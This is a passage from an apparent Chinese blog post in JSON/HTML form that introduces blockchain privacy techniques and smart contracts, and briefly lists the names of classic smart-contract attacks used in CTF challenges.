信息，还是可以追查到帐户和交易的关联性，同时进行社工分析，就有可能被找出现实中的身份信息。</p>\n<p>​\t\t为了更好地保护隐私，基于加密算法，主要产生了以下四种加密方案：</p>\n<blockquote>\n<p>混币原理：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQjclQjclRTUlQjglODElRTYlOUMlOEQlRTUlOEElQTE=\">https://baike.baidu.com/item/ 混币服务</span></p>\n</blockquote>\n<blockquote>\n<p>环签名：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOEUlQUYlRTclQUQlQkUlRTUlOTAlOEQ=\">https://baike.baidu.com/item/ 环签名</span></p>\n</blockquote>\n<blockquote>\n<p>同态加密：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOTAlOEMlRTYlODAlODElRTUlOEElQTAlRTUlQUYlODY=\">https://baike.baidu.com/item/ 同态加密</span></p>\n</blockquote>\n<blockquote>\n<p>零知识证明（ZKP）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOUIlQjYlRTclOUYlQTUlRTglQUYlODYlRTglQUYlODElRTYlOTglOEU=\">https://baike.baidu.com/item/ 零知识证明</span></p>\n</blockquote>\n<h1 id=\"智能合约\"><a class=\"anchor\" href=\"#智能合约\">#</a> 智能合约</h1>\n<h2 id=\"概念定义-2\"><a class=\"anchor\" href=\"#概念定义-2\">#</a> 概念定义</h2>\n<blockquote>\n<p>​\t\t智能合约是一种旨在以信息化方式传播、验证或执行合同的计算机协议。智能合约允许在没有第三方的情况下进行可信交易，这些交易可追踪且不可逆转。</p>\n<p>​\t\t智能合约的目的是提供优于传统合约的安全方法，并减少与合约相关的其他交易成本。</p>\n</blockquote>\n<h2 id=\"数字形式\"><a class=\"anchor\" href=\"#数字形式\">#</a> 数字形式</h2>\n<blockquote>\n<p>数字形式意味着合约不得不写入计算机可读的代码中。</p>\n</blockquote>\n<p>​\t\t简单来讲，智能合约就是部署在区块链上的代码，而代码的执行则是在代码的执行是在本地的 EVM 中。本地的 EVM 读取了区块链上的代码，并在本地运行后，再将结果写入到区块链中。</p>\n<h2 id=\"智能合约的安全\"><a class=\"anchor\" href=\"#智能合约的安全\">#</a> 智能合约的安全</h2>\n<p>​\t\t既然智能合约的本质是能够运行的代码，那么相应的，它也会产生出一系列安全漏洞，并且大部分智能合约是开源的，剩余的小部分，也可以进行反编译，这使得智能合约的漏洞会更容易被找到。</p>\n<p>​\t\tPWN 中的智能合约题，便是利用合约代码中的漏洞，对合约进行攻击，从而达到获取 flag 的目的。</p>\n<p>​\t\t比较经典的攻击有：</p>\n<ul>\n<li>重入攻击</li>\n<li>整数溢出</li>\n<li>伪随机数回滚攻击</li>\n<li>薅羊毛（Airdrop Hunting）</li>\n<li>短地址攻击</li>\n<li>…………</li>\n</ul>\n",
            "tags": [
                "Blockchain"
            ]
        }
    ]
}